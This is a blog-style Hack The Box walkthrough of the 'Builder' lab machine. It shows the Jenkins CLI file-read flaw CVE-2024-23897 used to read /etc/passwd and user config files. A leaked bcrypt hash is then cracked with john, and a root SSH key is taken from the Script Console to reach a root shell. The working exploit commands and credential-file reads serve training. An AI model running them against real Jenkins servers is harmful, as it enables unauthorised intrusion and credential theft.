# Exposed Pipelines:📈 Rooting HTB Builder via CVE-2024-23897

From CLI leak to Root shell: A complete Red Team walkthrough of HTB Builder, exposing the critical risks in CI/CD pipelines.

---

### Builder HTB Machine Walk-Through!

![](https://cdn-images-1.medium.com/max/800/1*MpOVK1AvTwupvMa1O9jjqQ.png)

<a href="https://medium.com/bugbountywriteup/exposed-pipelines-rooting-htb-builder-via-cve-2024-23897-18b185b3d080?sk=1b5ac1a4b3fe2d32d659421d0144a321" class="markup--anchor markup--p-anchor" data-href="https://medium.com/bugbountywriteup/exposed-pipelines-rooting-htb-builder-via-cve-2024-23897-18b185b3d080?sk=1b5ac1a4b3fe2d32d659421d0144a321" target="_blank">**If you are not a Member Click Here to read Full-Story HERE!**</a>

### Executive Summary

**Target:** Builder (Hack The Box) **OS:** Linux **Difficulty:** Medium **Attack Vectors:** Jenkins CLI Exploit (CVE-2024–23897) -\> Credential Dumping -\> SSH Key Decryption.

This assessment targeted “Builder,” a Linux-based machine hosting a Jenkins automation server. The initial foothold was gained by identifying a critical vulnerability in the **Jenkins CLI (CVE-2024–23897)** which allowed for unauthenticated Arbitrary File Read. This vulnerability was leveraged to leak the contents of the **`/etc/passwd`** file and the internal Jenkins user database.

Lateral movement to the user **`jennifer`** was achieved by extracting the password hash from the leaked user configuration files and cracking it offline. Finally, Root privilege escalation was accomplished by locating an encrypted **SSH key** stored within the Jenkins credential manager and utilizing the internal Jenkins Script Console to decrypt the private key, granting unrestricted administrative access to the host.

### 1.0 Initial Foothold

![](https://cdn-images-1.medium.com/max/800/1*AM3IjrvQ2ARZt-bw8o_0sQ.png)
<figcaption>(Enumeration &amp; Reconnaissance)</figcaption>

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan Analysis

The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target `10.10.11.10`.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Builder]
<SNIP>
Nmap scan report for 10.10.11.10
Host is up, received reset ttl 63 (0.032s latency).
Scanned at 2025-12-17 19:43:50 EST for 82s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-robotstxt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.18)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

#### 1.2 Key Findings

- <span id="f755">**Port 22 (SSH):** OpenSSH 8.9p1 (Ubuntu).</span>
- <span id="7c71">**Port 8080 (HTTP):** Jetty 10.0.18 hosting a **Jenkins** instance.</span>
- <span id="45b8">**Service Discovery:** The **`http-title`** explicitly identifies the service as "Dashboard \[Jenkins\]".</span>

#### 1.3 Web Application Enumeration

**1.3.1 Analysis:** Navigating to **`http://10.10.11.10:8080`**, we were presented with a standard Jenkins login page. No default credentials (admin/admin) were effective.

**1.3.2 Version Fingerprinting:** By examining the HTTP response headers and the footer of the login page, we identified the Jenkins version as **2.441**.

**1.3.3 Vulnerability Discovery:** A search for vulnerabilities associated with Jenkins 2.441 revealed **CVE-2024–23897**.

- <span id="7292">**Description:** This vulnerability allows unauthenticated attackers to read arbitrary files on the Jenkins controller file system by abusing the built-in Command Line Interface **(CLI)** parser.</span>
- <span id="ed41">**Vector:** The specific flaw lies in the **`args4j`** library used by the CLI, which parses the **`@`** character as a command to read a file path.</span>

### 2.0 Initial Shell

![](https://cdn-images-1.medium.com/max/800/1*5bgMF6OOerqm8s26D9U-bQ.png)

#### 2.1 Exploitation (CVE-2024–23897)

**2.1.1 The Exploit:** The vulnerability exists within the **Jenkins CLI** ***(Command Line Interface)***, which uses the **`args4j`** library. This library improperly parses the **`@`** character, interpreting any string following it as a file path to be read. By passing **`@/etc/passwd`** as an argument to the **`connect-node`** command, we can force the server to echo the file contents back to us in the error message.

**2.1.2 Tool Setup:** First, we downloaded the **`jenkins-cli.jar`** directly from the target instance to ensure version compatibility.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Builder]
└─$ wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
--2025-12-17 21:17:48--  http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
Connecting to 10.10.11.10:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3623400 (3.5M) [application/java-archive]
Saving to: ‘jenkins-cli.jar’

jenkins-cli.jar     100%[===================>]   3.46M  1.14MB/s    in 3.0s

2025-12-17 21:17:52 (1.14 MB/s) - ‘jenkins-cli.jar’ saved [3623400/3623400]
```

**2.1.3 Execution (File Leak):** We executed the **CLI** tool to read the **`/etc/passwd`** file.

**2.1.4 Output Analysis:** The server responded with an error, inadvertently leaking the file contents:

```
 java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/etc/passwd"
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.

Run this command to pull the password hash from that directory.
```

**Key Findings:**

1.  <span id="757e">**Vulnerability Confirmed:** The ability to read **`/etc/passwd`** confirms the **Critical** severity of **CVE-2024-23897**.</span>
2.  <span id="0669">**Service User:** The process is running as **`jenkins`** (UID 1000).</span>
3.  <span id="619f">**Home Directory:** The Jenkins home directory is located at **`/var/jenkins_home`**.</span>

#### Next Action: The Lateral Move

Now that we know where the home directory is (/var/jenkins_home), we need to find the User Database to get the actual username hash.

### 2.2 Credential Exfiltration

**2.2.1 Locating User Data:** Jenkins stores user data in XML files. To find the specific directory for the target user `jennifer`, we read the main user mapping file.

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/var/jenkins_home/users/users.xml"
```

**2.2.2 Output Analysis:** The error stream leaked the XML structure, revealing the directory mapping:

```
<string>jennifer</string>
<string>jennifer_12108429903186576833</string>
```

- <span id="1fc6">This confirmed that Jennifer’s data is located at: **`/var/jenkins_home/users/jennifer_12108429903186576833/`**.</span>

**2.2.2 Extracting the Hash:** With the directory path confirmed, we targeted Jennifer’s configuration file (**`config.xml`**) to dump her hashed credentials.

#### Next Action: Get the Hash

Run this command to pull the password hash from that directory.

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
```

**2.2.3 Analysis:** The command dumped the raw XML configuration for the user. Buried within the output, we identified the **`<passwordHash>`** tag containing a bcrypt hash.

```
<user>
  <id>jennifer</id>
  <properties>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
  </properties>
</user>
```

#### 2.3 Cracking & Access

**2.3.1 Offline Cracking:** We cleaned the hash by removing the **`#jbcrypt:`** prefix and the XML tags, saving the core hash (**`$2a$10$...`**) to a file named **`hash.txt`**. We then utilized **`john`** with the **`rockyou.txt`** wordlist to crack it.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Builder]
└─$ echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (?)
1g 0:00:00:00 DONE (2025-12-17 21:43) 4.000g/s 216.0p/s 216.0c/s 216.0C/s 123456..basketball
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### 3.0 Privilege Escalation

![](https://cdn-images-1.medium.com/max/800/1*Vwo9yhNfxH4kpSdeRwn-sA.png)

#### 3.1 Internal Reconnaissance

After logging in with the credentials **`jennifer:princess`**, we navigated to **Manage Jenkins** \> **Credentials** \> **System** \> **Global credentials (unrestricted)**.

We identified a stored credential labeled **“Root SSH Key”**. However, the UI obscures the private key data, displaying it only as **`****`**. The **`jennifer`** user does not have permission to view the secret directly in the interface.

#### 3.2 The Script Console Exploit

**3.2.1 The Vector:** Jenkins provides a powerful administrative feature called the **Script Console** (accessible at **`/script`**), which allows users with sufficient privileges to execute arbitrary Groovy code on the server. This console runs within the application's context, bypassing UI-level restrictions.

**3.2.2 The Decryption:** Because the code runs internally, we can access the **`SystemCredentialsProvider`** object and invoke methods to retrieve the raw secrets. We executed the following Groovy script to dump all stored SSH keys in plaintext:

![](https://cdn-images-1.medium.com/max/800/1*GDSSdn-o3xAxtMqtcee47Q.png)

![](https://cdn-images-1.medium.com/max/800/1*0hPKMiVAFjaNBieHvzTX0Q.png)

#### 3.3 Root Compromise

**3.3.1 SSH Access:** With the raw private key recovered from the Script Console, we saved it to a local file named **`id_rsa`**. To strictly adhere to SSH security protocols, we restricted the file permissions to **`600`** (read/write for owner only).

```
# Set permissions
chmod 600 id_rsa

# Authenticate as Root
ssh -i id_rsa root@10.10.11.10
```

**Result:** The server accepted the key, and we dropped into a root shell without a password prompt.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Builder]
└─$ ssh -i id_rsa root@10.10.11.10
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Thu Dec 18 02:55:47 AM UTC 2025

  System load:              0.0166015625
  Usage of /:               66.2% of 5.81GB
  Memory usage:             37%
  Swap usage:               0%
  Processes:                216
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.10
  IPv6 address for eth0:    dead:beef::250:56ff:feb0:5c4e

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 13:15:44 2024 from 10.10.14.40
root@builder:~# find / -name user.txt 2>/dev/null
/home/jennifer/user.txt
/var/lib/docker/volumes/3bfb34878c4bae6edf3996e9d02f96e12d20e34293f72da5e0f4d881df5af92d/_data/user.txt
cat root@builder:~# cat /home/jennifer/user.txt
f21244451beb8089979e8fe7806c093e
root@builder:~# cat /root/root.txt
659a5416e126dfd311aff2e1362cf2b1
root@builder:~#
```

### Final Thoughts: The Red Team Mandate

Throughout this assessment of “Builder,” we demonstrated that a chain is only as strong as its weakest link — and often, that link is the tool building the chain.

We didn’t exploit the Linux kernel; we didn’t brute-force SSH. We exploited a **misconfiguration in the DevOps pipeline**. We utilized a known vulnerability in Jenkins **(CVE-2024–23897)** to leak internal configuration files, cracked a weak password (**`princess`**), and used built-in administrative tools **(Script Console)** to decrypt keys that were supposed to be hidden.

This reinforces a critical lesson for Blue Teams: **Your build server is a production server.** If an attacker controls Jenkins, they control the code, the secrets, and the infrastructure itself.

### The Verse

> “For there is nothing hidden that will not be disclosed, and nothing concealed that will not be known or brought out into the open.”* — ****Luke 8:17 (NIV)***

**How it ties to this Red Team assessment:** This machine was built entirely on the concept of “hidden” secrets. The **`/etc/passwd`** file was hidden from the web user; the Jenkins secrets were hidden behind asterisks (**`****`**); the User flag was hidden in a non-standard directory. Yet, as the verse warns, nothing hidden remains concealed forever. Through methodical enumeration and understanding the underlying technology (Groovy/Java), we brought every secret into the open. Security cannot rely on "hiding" things; it must rely on robust architecture that remains secure even when exposed.

---

### Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="3ac5">Is there a specific tool you wish existed?</span>
- <span id="f8a6">Is there a hacking concept you want me to learn and explain?</span>
- <span id="cdb8">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 25, 2025](https://medium.com/p/18b185b3d080).

<a href="https://medium.com/@nicholasmullenski/exposed-pipelines-rooting-htb-builder-via-cve-2024-23897-18b185b3d080" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
